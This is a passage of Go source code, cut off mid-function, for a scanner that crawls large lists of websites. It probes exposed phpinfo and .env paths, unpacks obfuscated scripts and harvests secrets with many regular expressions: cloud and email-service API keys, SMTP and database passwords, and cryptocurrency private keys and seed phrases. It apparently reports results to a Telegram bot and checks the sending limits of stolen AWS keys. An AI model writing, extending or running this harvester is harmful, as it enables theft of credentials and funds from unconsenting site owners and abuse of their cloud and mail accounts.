package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/servicequotas"
	"github.com/aws/aws-sdk-go-v2/service/ses"
	"github.com/aws/aws-sdk-go-v2/service/sesv2"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/pterm/pterm"
)

var client *http.Client

const defaultConfigPath = "config.json"

var requestTimeoutSeconds int
var batchSize int

type Counters struct {
	mu sync.Mutex
	URLsLoaded int
	TokensHarvested int
	TokensValidated int
	CryptoKeysFound int
	AWSKeysValidated int
	BrevoKeysFound int
	APIsFoundTotal int
	APIsValidated int
	ValidSMTP int
}

var globalCounters Counters

type Config struct {
	Telegram struct {
		BotToken string `json:"bot_token"`
		ChatID string `json:"chat_id"`
	} `json:"telegram"`
	// Pindahkan fitur umum yang mengontrol proses scanning utama
	ScanningFeatures struct {
		AWSMainScan bool `json:"aws_main_scan"`
		GitHubTokenDeepScan bool `json:"github_token_deep_scan"`
		SMTPCredentialsScan bool `json:"smtp_credentials_scan"`
	} `json:"scanning_features"`
	AWSChecks struct {
		SESQuotaCheck bool `json:"ses_quota_check"`
		SNSLimitCheck bool `json:"sns_limit_check"`
		FargateLimitCheck bool `json:"fargate_limit_check"`
		FederationConsoleURL bool `json:"federation_console_url"`
	} `json:"aws_checks"`
	// Fitur yang mengontrol validasi API spesifik
	APIValidation struct {
		OpenAI bool `json:"openai"`
		Anthropic bool `json:"anthropic"`
		Stripe bool `json:"stripe"`
		GCPAPIKey bool `json:"gcp_api_key"`
		SendGrid bool `json:"sendgrid"`
		Mailgun bool `json:"mailgun"`
		Twilio bool `json:"twilio"`
		Nexmo bool `json:"nexmo"`
		Telnyx bool `json:"telnyx"`
		MessageBird bool `json:"messagebird"`
		GitHub bool `json:"github"` 
	} `json:"api_validation"`
	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
		Brevo bool `json:"brevo"`
		XSMTP bool `json:"xsmtp"`
		Tencent bool `json:"tencent"`
		Mailgun bool `json:"mailgun"`
		NewMailgun bool `json:"new_mailgun"`
		Mandrill bool `json:"mandrill"`
		MailerSend bool `json:"mailersend"`
		GitHub bool `json:"github"`
		Twilio bool `json:"twilio"`
		Nexmo bool `json:"nexmo"`
		Telnyx bool `json:"telnyx"`
		SMTP bool `json:"smtp"`
	} `json:"features"`
	SMTPTestEmail string `json:"smtp_test_email"`
}

type Enhancer struct {
	client *http.Client
	firebasePattern *regexp.Regexp
	supabasePattern *regexp.Regexp
	firebaseKeyPatt *regexp.Regexp
	bearerPattern *regexp.Regexp
	evalAtobPattern *regexp.Regexp
	evalUnescapePatt *regexp.Regexp
	base64Candidate *regexp.Regexp
	sitemapPattern *regexp.Regexp
	scriptSrcPattern *regexp.Regexp
	urlParamPattern *regexp.Regexp
}

type AWSScanner struct {
	Config *Config
	BlacklistPattern *regexp.Regexp

	AWSAccessKeyPattern *regexp.Regexp
	AWSSecretKeyPattern *regexp.Regexp
	SendGridAPIKeyPattern *regexp.Regexp
	BrevoAPIKeyPattern *regexp.Regexp
	XSMTPAPIKeyPattern *regexp.Regexp
	TencentAccessKeyPattern *regexp.Regexp
	MailgunAPIKeyPattern *regexp.Regexp
	MandrillAppAPIKeyPattern *regexp.Regexp
	MailerSendAPIKeyPattern *regexp.Regexp
	NewMailgunAPIKeyPattern *regexp.Regexp
	GitHubAccessTokenPattern *regexp.Regexp
	AWSRandomPattern *regexp.Regexp
	AWSAccessKeyPatternInfo *regexp.Regexp
	AWSSecretKeyPatternInfo *regexp.Regexp
	SendGridAPIKeyPatternInfo *regexp.Regexp
	MailgunAPIKeyPatternInfo *regexp.Regexp
	GitHubAccessTokenPatternInfo *regexp.Regexp
	TwilioSIDPatternInfo *regexp.Regexp
	TwilioAuthPatternInfo *regexp.Regexp
	TwilioAuthPatternV2Info *regexp.Regexp
	TwilioEncodePatternInfo *regexp.Regexp
	NexmoApiPatternInfo *regexp.Regexp
	NexmoSecretPatternInfo *regexp.Regexp
	TelnyxApiPatternInfo *regexp.Regexp
	SMSGatewayPattern *regexp.Regexp
	DBCredentialsPattern *regexp.Regexp
	StripePattern *regexp.Regexp
	OpenAIAPIPattern *regexp.Regexp
	AnthropicPattern *regexp.Regexp
	MessageBirdPattern *regexp.Regexp
	MailValPattern *regexp.Regexp
	SMTPHostPattern *regexp.Regexp
	SMTPPortPattern *regexp.Regexp
	SMTPUserPattern *regexp.Regexp
	SMTPPassPattern *regexp.Regexp
	SMTPFromPattern *regexp.Regexp
	AWSSMTPHostPattern *regexp.Regexp

	AzureSASTokenPattern *regexp.Regexp
	GCPAPIKeyPattern *regexp.Regexp
	AliyunAccessKeyPattern *regexp.Regexp

	AWSSessionTokenPattern *regexp.Regexp
	AWSSESUserPattern *regexp.Regexp

	RealCryptoPatterns []*regexp.Regexp

	DefaultRegion string
	PHPInfoPaths []string
	EnvPaths []string

	ValidKeyLimits sync.Map
	KnownKeys sync.Map
	TempDir string

	ProgressBar *pterm.ProgressbarPrinter
}

type TruffleHogResult struct {
	SourceMetadata struct {
		Data struct {
			Commit string `json:"commit"`
			Email string `json:"email"`
			File string `json:"file"`
		} `json:"Data"`
		SourceDetails struct {
			Repository string `json:"Repository"`
		} `json:"SourceDetails"`
	} `json:"SourceMetadata"`
	DetectorName string `json:"DetectorName"`
	Verified bool `json:"Verified"`
	Secret string `json:"Secret"`
}

type GitleaksResult struct {
	Description string `json:"Description"`
	Secret string `json:"Secret"`
	RuleID string `json:"RuleID"`
	File string `json:"File"`
	Commit string `json:"Commit"`
	Message string `json:"Message"`
}

var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)

func tryDecodeBase64(s string) string {
	re := regexp.MustCompile(`[^a-zA-Z0-9+/=_-]`)
	cleaned := re.ReplaceAllString(s, "")

	if len(cleaned) < 40 {
		return ""
	}

	standardized := strings.ReplaceAll(cleaned, "-", "+")
	standardized = strings.ReplaceAll(standardized, "_", "/")

	switch len(standardized) % 4 {
	case 2:
		standardized += "=="
	case 3:
		standardized += "="
	}

	decodedBytes, err := base64.StdEncoding.DecodeString(standardized)
	if err == nil {
		if isPrintableText(decodedBytes) {
			return string(decodedBytes)
		}
	}
	return ""
}

func isPrintableText(data []byte) bool {
	if len(data) == 0 {
		return false
	}
	nonPrintableCount := 0
	for _, b := range data {
		if (b < 32 || b > 126) && b != 9 && b != 10 && b != 13 {
			nonPrintableCount++
		}
	}
	return float64(nonPrintableCount)/float64(len(data)) < 0.3
}

func countLines(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	buf := make([]byte, 32*1024)
	count := 0
	lineSep := []byte{'\n'}

	for {
		c, err := file.Read(buf)
		count += bytes.Count(buf[:c], lineSep)

		switch {
		case err == io.EOF:
			return count, nil
		case err != nil:
			return count, err
		}
	}
}

func loadConfig(path string) (*Config, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	// Menggunakan json.Unmarshal untuk memuat konfigurasi
	if err := json.Unmarshal(b, &cfg); err != nil {
		return nil, err
	}
	// Perlu juga memuat konfigurasi lama untuk compatibility
	// (Walaupun di versi ini kita hanya fokus pada struktur baru, 
	// ini penting jika ada field yang terpisah)
	var tempConfig map[string]interface{}
	if err := json.Unmarshal(b, &tempConfig); err != nil {
		return nil, err
	}
	// Beberapa fitur lama di 'features' perlu di mapping ke struct baru jika ada
	// Contoh: jika fitur lama masih ada di config.json dan perlu dipertahankan
	// (meskipun di JSON baru kita sudah memisahkannya)
	if f, ok := tempConfig["features"].(map[string]interface{}); ok {
		if val, ok := f["brevo"].(bool); ok {
			cfg.Features.Brevo = val
		}
		// Ulangi untuk fitur lama lainnya jika diperlukan
	}
	
	return &cfg, nil
}

func NewEnhancer(client *http.Client) *Enhancer {
	return &Enhancer{
		client: client,
		firebasePattern: regexp.MustCompile(`(?i)apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		supabasePattern: regexp.MustCompile(`(?i)SUPABASE_URL\s*[:=]\s*["'](https?://[\w.-]+)/?\b`),
		firebaseKeyPatt: regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		bearerPattern: regexp.MustCompile(`(?i)Bearer\s+([A-Za-z0-9\-_.=]{20,300})`),
		evalAtobPattern: regexp.MustCompile(`eval\(atob\(['\"]([A-Za-z0-9\+/=_-]{20,})['\"]\)\)`),
		evalUnescapePatt: regexp.MustCompile(`eval\(unescape\(['\"](%[0-9A-Fa-f]{2}|\\x[0-9A-Fa-f]{2})+['\"]\)\)`),
		base64Candidate: regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`),
		sitemapPattern: regexp.MustCompile(`(?i)<loc>(https?://[^<]+)</loc>`),
		scriptSrcPattern: regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+)["']`),
		urlParamPattern: regexp.MustCompile(`[?&]([A-Za-z0-9_\-\.]+)=([A-Za-z0-9%_\-\./:+@\s]{8,200})`),
	}
}

func NewAWSScanner(configPath string) *AWSScanner {
	cfg, err := loadConfig(configPath)
	if err != nil {
		pterm.Error.Printf("Failed to load config: %v. Make sure config.json exists.\n", err)
		os.Exit(1)
	}

	client = &http.Client{
		Timeout: time.Duration(requestTimeoutSeconds) * time.Second * 2,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 1000,
			DisableKeepAlives:   true,
		},
	}

	tempDir := "temp_repos"
	os.MkdirAll(tempDir, 0755)

	blacklist := []string{"cloudflare", "bootstrap", "jquery", "/wp-content/", "/jwplayer.js", "awstatic"}
	blacklistPattern := regexp.MustCompile(strings.Join(blacklist, "|"))

	phpinfoPaths := []string{
		"/info",
		"/phpinfo",
		"/phpinfo.php",
		"/info.php",
		"/_profiler/phpinfo",
		"/php.php",
		"/test.php",
		"/i.php",
		"/asdf.php",
		"/phpversion.php",
		"/temp.php",
		"/old/phpinfo.php",
		"/infophp.php",
		"/server/php",
		"/php/info.php",
		"/php/phpinfo.php",
		"/test/phpinfo.php",
		"/demo/phpinfo.php",
		"/site/phpinfo.php",
		"/tmp/phpinfo.php",
		"/dev/phpinfo.php",
		"/local/phpinfo.php",
		"/backend/phpinfo.php",
		"/blog/phpinfo.php",
		"/_profiler/info",
		"/server-status",
		"/index.php?page=phpinfo",
		"/index.php?view=phpinfo",
		"/index.php?action=phpinfo",
		"/index.php?do=phpinfo",
		"/index.php?mode=phpinfo",
		"/index.php?phpinfo=1",
		"/index.php?=phpinfo()",
		"/index.php?=-phpinfo()",
		"/?=phpinfo",
		"/?phpinfo=1",
		"/?page=phpinfo",
		"/test/php.php",
		"/test/info.php",
		"/test/index.php",
		"/test/testing.php",
		"/testing/phpinfo.php",
		"/testing/info.php",
		"/testing/php.php",
		"/php-info.php",
		"/php_info.php",
		"/info/php.php",
		"/info/info.php",
		"/info/phpinfo.php",
		"/phpinfo/info.php",
		"/phpinfo/test.php",
		"/server-info.php",
		"/server_info.php",
		"/tests/phpinfo.php",
		"/tests/info.php",
		"/admin/phpinfo.php",
		"/admin/info.php",
		"/admin/php.php",
		"/admin/php_info.php",
		"/admin/php-info.php",
		"/administrator/phpinfo.php",
		"/administrator/info.php",
		"/web/phpinfo.php",
		"/web/info.php",
		"/web/php.php",
		"/_inc/phpinfo.php",
		"/includes/phpinfo.php",
		"/include/phpinfo.php",
		"/inc/phpinfo.php",
		"/core/phpinfo.php",
		"/core/info.php",
		"/app/phpinfo.php",
		"/apps/phpinfo.php",
		"/upload/phpinfo.php",
		"/uploads/phpinfo.php",
		"/exported/phpinfo.php",
		"/backup/phpinfo.php",
		"/back/phpinfo.php",
		"/bak/phpinfo.php",
		"/.backup/phpinfo.php",
		"/_backup/phpinfo.php",
		"/beta/phpinfo.php",
		"/old/info.php",
		"/2020/phpinfo.php",
		"/2021/phpinfo.php",
		"/2022/phpinfo.php",
		"/2023/phpinfo.php",
		"/2024/phpinfo.php",
		"/v1/phpinfo.php",
		"/v2/phpinfo.php",
		"/v3/phpinfo.php",
		"/api/phpinfo.php",
		"/api/info.php",
		"/api/v1/phpinfo.php",
		"/api/v2/phpinfo.php",
		"/apis/phpinfo.php",
		"/site-info.php",
		"/server.php",
		"/host.php",
		"/host-info.php",
		"/status.php",
		"/system.php",
		"/system/info.php",
		"/sys/info.php",
		"/sys/phpinfo.php",
		"/.php",
		"/1.php",
		"/x.php",
		"/xx.php",
		"/xxx.php",
		"/db.php",
		"/database.php",
		"/home.php",
		"/default.php",
		"/conf.php",
		"/config.php",
		"/configuration.php",
		"/_test.php",
		"/_phpinfo.php",
		"/__test.php",
		"/__phpinfo.php",
	}
	envPaths := loadEnvPaths()

	realCryptoPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)(?:ethereum_private_key|eth_private_key|ethereum_key|eth_key|private_key|secret_key|wallet_private|deployer_private|owner_private)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:bitcoin_private_key|btc_private_key|bitcoin_key|btc_key|private_key|secret_key|wallet_private)\s*[=:]\s*["\']?([5KL][1-9A-HJ-NP-Za-km-z]{50,52})["\']?`),
		regexp.MustCompile(`(?i)(?:solana_private_key|sol_private_key|solana_key|sol_key|private_key|secret_key|wallet_private)\s*[=:]\s*["\']?([1-9A-HJ-NP-Za-km-z]{87,88})["\']?`),
		regexp.MustCompile(`(?i)(?:bsc_private_key|bnb_private_key|binance_private_key|bsc_key|bnb_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:polygon_private_key|matic_private_key|polygon_key|matic_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:avalanche_private_key|avax_private_key|avalanche_key|avax_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:fantom_private_key|ftm_private_key|fantom_key|ftm_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:arbitrum_private_key|arb_private_key|arbitrum_key|arb_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:optimism_private_key|op_private_key|optimism_key|op_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:deployer_private_key|owner_private_key|admin_private_key|master_private_key|deployer_key|owner_key|admin_key|master_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:mainnet_private_key|testnet_private_key|prod_private_key|production_private_key|mainnet_key|testnet_key|prod_key|production_key)\s*[=:]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
		regexp.MustCompile(`(?i)(?:mnemonic|seed_phrase|recovery_phrase|backup_phrase|wallet_seed)\s*[=:]\s*["\']?([a-z]+(?:\s+[a-z]+){11,23})["\']?`),
		regexp.MustCompile(`(?i)"(?:private_key|privateKey|secret_key|secretKey|wallet_private|walletPrivate)"\s*:\s*"(0x)?([0-9a-fA-F]{64})"`),
		regexp.MustCompile(`(?i)(?:export\s+)?(?:ETHEREUM_PRIVATE_KEY|ETH_PRIVATE_KEY|PRIVATE_KEY|SECRET_KEY|WALLET_PRIVATE_KEY|DEPLOYER_PRIVATE_KEY|OWNER_PRIVATE_KEY)\s*[=]\s*["\']?(0x)?([0-9a-fA-F]{64})["\']?`),
	}

	return &AWSScanner{
		Config: cfg,
		BlacklistPattern: blacklistPattern,
		AWSAccessKeyPattern: regexp.MustCompile(`['"](AKIA[0-9A-Z]{16})['"]`),
		AWSSecretKeyPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{40})['"]`),
		SendGridAPIKeyPattern: regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
		BrevoAPIKeyPattern: regexp.MustCompile(`xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`),
		XSMTPAPIKeyPattern: regexp.MustCompile(`xsmtpsib-[a-fA-F0-9]{64}-[a-zA-Z0-9]{16}`),
		TencentAccessKeyPattern: regexp.MustCompile(`['"]AKID[a-zA-Z0-9]{32}['"]`),
		MailgunAPIKeyPattern: regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
		MandrillAppAPIKeyPattern: regexp.MustCompile(`['"]md-[0-9a-zA-Z]{22}['"]`),
		MailerSendAPIKeyPattern: regexp.MustCompile(`mlsn.-[0-9a-zA-Z]{70}`),
		NewMailgunAPIKeyPattern: regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
		GitHubAccessTokenPattern: regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
		TwilioSIDPatternInfo: regexp.MustCompile(`AC[a-f0-9]{32}`),
		TwilioAuthPatternInfo: regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
		TwilioAuthPatternV2Info: regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
		TwilioEncodePatternInfo: regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
		NexmoApiPatternInfo: regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?([a-zA-Z0-9]{8})["\']?`),
		NexmoSecretPatternInfo: regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9]{16})["\']?`),
		TelnyxApiPatternInfo: regexp.MustCompile(`KEY[A-Z0-9]{32}_[A-Za-z0-9]{22}`),
		AWSRandomPattern: regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
		AWSSMTPHostPattern: regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
		DefaultRegion: "us-east-1",
		AWSAccessKeyPatternInfo: regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`),
		AWSSecretKeyPatternInfo: regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
		SendGridAPIKeyPatternInfo: regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
		MailgunAPIKeyPatternInfo: regexp.MustCompile(`\bkey-[0-9a-zA-Z]{32}\b`),
		GitHubAccessTokenPatternInfo: regexp.MustCompile(`\b(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})\b`),
		StripePattern: regexp.MustCompile(`(sk_live_[0-9a-zA-Z]{16,32})`),
		OpenAIAPIPattern: regexp.MustCompile(`sk-[a-zA-Z0-9]{48}`),
		AnthropicPattern: regexp.MustCompile(`sk-ant-[a-zA-Z0-9]{32}-[a-zA-Z0-9]{64}`),
		MessageBirdPattern: regexp.MustCompile(`(AccessKey|TestKey)_[a-zA-Z0-9]{32}`),
		PHPInfoPaths: phpinfoPaths,
		EnvPaths: envPaths,
		SMTPHostPattern: regexp.MustCompile(`(?i)MAIL_HOST\s*[:=]\s*([^\s'"]+)`),
		SMTPPortPattern: regexp.MustCompile(`(?i)MAIL_PORT\s*[:=]\s*([0-9]+)`),
		SMTPUserPattern: regexp.MustCompile(`(?i)MAIL_USERNAME\s*[:=]\s*([^\s'"]+)`),
		SMTPPassPattern: regexp.MustCompile(`(?i)MAIL_PASSWORD\s*[:=]\s*([^\s'"]+)`),
		SMTPFromPattern: regexp.MustCompile(`(?i)MAIL_FROM\s*[:=]\s*([^\s'"]+)`),
		SMSGatewayPattern: regexp.MustCompile(`(?i)(?P<service>twilio|vonage|aliyun|smsastral|infobip|nexmo|clickatell|talk2all).*?(?:api[_-]?key|login|username)[\s:=]+(?P<username>[A-Za-z0-9_-]+).*?(?:secret|password|token)[\s:=]+(?P<password>[A-Za-z0-9_-]+)`),
		DBCredentialsPattern: regexp.MustCompile(`(?i)(?P<db>mysql|maria(?:db)?|mongodb|phpmyadmin)[\s:]*://(?P<username>[a-zA-Z0-9_.+-]+):(?P<password>[^@]+)@(?P<host>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::(?P<port>\d+))?`),
		MailValPattern: regexp.MustCompile(`(?i)(?P<service>zerobounce|neverbounce|bouncer)[\s:=]+(?P<apikey>[A-Za-z0-9_-]{16,64})`),
		AzureSASTokenPattern: regexp.MustCompile(`(?i)sig=[a-zA-Z0-9%]+&se=[a-zA-Z0-9%]+&sr=[a-zA-Z]+&sp=[a-zA-Z]+&sv=[a-zA-Z0-9.]+`),
		GCPAPIKeyPattern: regexp.MustCompile(`AIza[0-9A-Za-z-_]{35}`),
		AliyunAccessKeyPattern: regexp.MustCompile(`(?i)LTAI[A-Z0-9]{16}`),

		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{256,})['"]`),
		AWSSESUserPattern: regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),

		RealCryptoPatterns: realCryptoPatterns,
		ValidKeyLimits: sync.Map{},
		KnownKeys: sync.Map{},
		TempDir: tempDir,
	}
}

func (e *Enhancer) EnhanceScanner(a *AWSScanner) {
	ePatterns := []*regexp.Regexp{
		//regexp.MustCompile(`(?i)apiKey["']?\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
		//regexp.MustCompile(`(?i)SUPABASE_KEY["']?\s*[:=]\s*["']?([A-Za-z0-9-_]{32,200})["']?`),
		//regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
		//regexp.MustCompile(`(?i)YA29\.[0-9A-Za-z\-_]{10,200}`),
		//regexp.MustCompile(`(?i)sk_live_[0-9a-zA-Z]{16,64}`),
	}

	for _, p := range ePatterns {
		a.RealCryptoPatterns = append(a.RealCryptoPatterns, p)
	}
}

func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner) {
	visited := make(map[string]struct{})
	queue := []struct{
		url string
		depth int
	}{{startURL, 0}}

	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]
		if item.depth > maxDepth {
			continue
		}
		if _, ok := visited[item.url]; ok {
			continue
		}
		visited[item.url] = struct{}{}

		body, headers, err := e.fetchURL(item.url)
		if err != nil {
			continue
		}

		e.scanHeaders(headers, item.url, a)

		a.checkAndSaveKeys(body, item.url)

		params := e.extractParamsFromURL(item.url)
		for _, p := range params {
			a.checkAndSaveKeys(p, item.url)
		}

		scripts := e.extractScriptSrc(body, item.url)
		for _, s := range scripts {
			jsBody, _, err := e.fetchURL(s)
			if err == nil {
				a.checkAndSaveKeys(jsBody, s)
				if decoded := e.tryUnpackJS(jsBody); decoded != "" {
					a.checkAndSaveKeys(decoded, s+" (unpack)")
				}
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, s) {
				queue = append(queue, struct{url string; depth int}{s, item.depth + 1})
			}
		}

		if item.depth == 0 {
			sm, _ := e.fetchSitemap(startURL)
			for _, u := range sm {
				if _, ok := visited[u]; !ok {
					if item.depth+1 <= maxDepth {
						queue = append(queue, struct{url string; depth int}{u, 1})
					}
				}
			}
		}

		links := e.extractLinksFromHTML(body, item.url)
		for _, l := range links {
			if _, ok := visited[l]; ok {
				continue
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, l) {
				queue = append(queue, struct{url string; depth int}{l, item.depth+1})
			}
		}

	}
}

func (e *Enhancer) fetchURL(rawurl string) (string, map[string][]string, error) {
	if !strings.HasPrefix(rawurl, "http") {
		return "", nil, errors.New("not-http")
	}
	req, err := http.NewRequest("GET", rawurl, nil)
	if err != nil {
		return "", nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; HScan-Enhancer/1.0)")

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	resp, err := e.client.Do(req.WithContext(ctx))
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()

	b, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return "", nil, err
	}

	return string(b), resp.Header, nil
}

func (e *Enhancer) scanHeaders(h map[string][]string, source string, a *AWSScanner) {
	for k, vals := range h {
		for _, v := range vals {
			if strings.Contains(strings.ToLower(k), "x-api") || strings.Contains(strings.ToLower(k), "authorization") || strings.Contains(strings.ToLower(k), "x-amz") {
				a.checkAndSaveKeys(v, source+" (header:"+k+")")
			}
			if e.base64Candidate.MatchString(v) {
				if dec := tryDecodeBase64(v); dec != "" {
					a.checkAndSaveKeys(dec, source+" (header-decoded)")
				}
			}
		}
	}
}

func (e *Enhancer) extractParamsFromURL(raw string) []string {
	vals := []string{}
	u, err := url.Parse(raw)
	if err != nil {
		matches := e.urlParamPattern.FindAllStringSubmatch(raw, -1)
		for _, m := range matches {
			if len(m) > 2 {
				v, _ := url.QueryUnescape(m[2])
				vals = append(vals, v)
			}
		}
		return vals
	}
	for _, vs := range u.Query() {
		for _, v := range vs {
			if len(v) >= 8 {
				vals = append(vals, v)
			}
		}
	}
	return vals
}

func (e *Enhancer) extractScriptSrc(htmlBody string, base string) []string {
	out := []string{}
	matches := e.scriptSrcPattern.FindAllStringSubmatch(htmlBody, -1)
	for _, m := range matches {
		if len(m) > 1 {
			src := strings.TrimSpace(m[1])
			if src == "" {
				continue
			}
			if strings.HasPrefix(src, "//") {
				src = "https:" + src
			}
			if strings.HasPrefix(src, "/") {
				if u, err := url.Parse(base); err == nil {
					src = u.Scheme + "://" + u.Host + src
				}
			}
			out = append(out, src)
		}
	}
	return unique(out)
}

func (e *Enhancer) tryUnpackJS(js string) string {
	if m := e.evalAtobPattern.FindStringSubmatch(js); len(m) > 1 {
		cand := m[1]
		switch len(cand)%4 {
		case 2:
			cand += "=="
		case 3:
			cand += "="
		}
		if b, err := base64.StdEncoding.DecodeString(cand); err == nil {
			if isPrintableText(b) {
				return string(b)
			}
		}
	}

	if m := e.evalUnescapePatt.FindString(js); m != "" {
		unescaped := strings.TrimPrefix(m, "eval(unescape(\"")
		unescaped = strings.TrimSuffix(unescaped, "\"))")
		unescaped = strings.TrimPrefix(unescaped, "eval(unescape('")
		unescaped = strings.TrimSuffix(unescaped, "'))")

		unq, err := url.QueryUnescape(unescaped)
		_ = err
		if unq != "" {
			return unq
		}
	}

	if m := e.base64Candidate.FindString(js); m != "" {
		if dec := tryDecodeBase64(m); dec != "" {
			return dec
		}
	}

	return ""
}

func (e *Enhancer) fetchSitemap(baseRaw string) ([]string, error) {
	u, err := url.Parse(baseRaw)
	if err != nil {
		return nil, err
	}
	roots := []string{
		fmt.Sprintf("%s://%s/sitemap.xml", u.Scheme, u.Host),
		fmt.Sprintf("%s://%s/sitemap_index.xml", u.Scheme, u.Host),
	}
	res := []string{}
	for _, s := range roots {
		body, _, err := e.fetchURL(s)
		if err != nil {
			continue
		}
		matches := e.sitemapPattern.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 {
				res = append(res, strings.TrimSpace(m[1]))
			}
		}
		if len(res) > 0 {
			return unique(res), nil
		}
	}
	return res, errors.New("no sitemap")
}

func (e *Enhancer) extractLinksFromHTML(body, base string) []string {
	hrefP := regexp.MustCompile(`(?i)href=["']([^"'#]+)["']`)
	outs := []string{}
	matches := hrefP.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 {
			link := strings.TrimSpace(m[1])
			if strings.HasPrefix(link, "javascript:") || strings.HasPrefix(link, "mailto:") {
				continue
			}
			if strings.HasPrefix(link, "/") {
				if u, err := url.Parse(base); err == nil {
					link = u.Scheme + "://" + u.Host + link
				}
			}
			if strings.HasPrefix(link, "http") {
				outs = append(outs, link)
			}
		}
	}
	return unique(outs)
}

func (e *Enhancer) isSameHost(a, b string) bool {
	u1, err1 := url.Parse(a)
	u2, err2 := url.Parse(b)
	if err1 != nil || err2 != nil {
		return false
	}
	return strings.EqualFold(u1.Hostname(), u2.Hostname())
}

func extractValueFromPhpInfoTable(htmlContent, settingName string) string {
	regexString := fmt.Sprintf(`(?is)<td\s+class="e">.*?%s.*?</td>\s*<td\s+class="v">(.*?)</td>`, regexp.QuoteMeta(settingName))
	re := regexp.MustCompile(regexString)
	match := re.FindStringSubmatch(htmlContent)
	if len(match) > 1 {
		val := strings.TrimSpace(match[1])
		val = strings.ReplaceAll(val, "&nbsp;", " ")
		val = strings.ReplaceAll(val, "&quot;", "\"")
		val = strings.Trim(val, "\"'")
		return val
	}
	return ""
}

func randomString(length int) string {
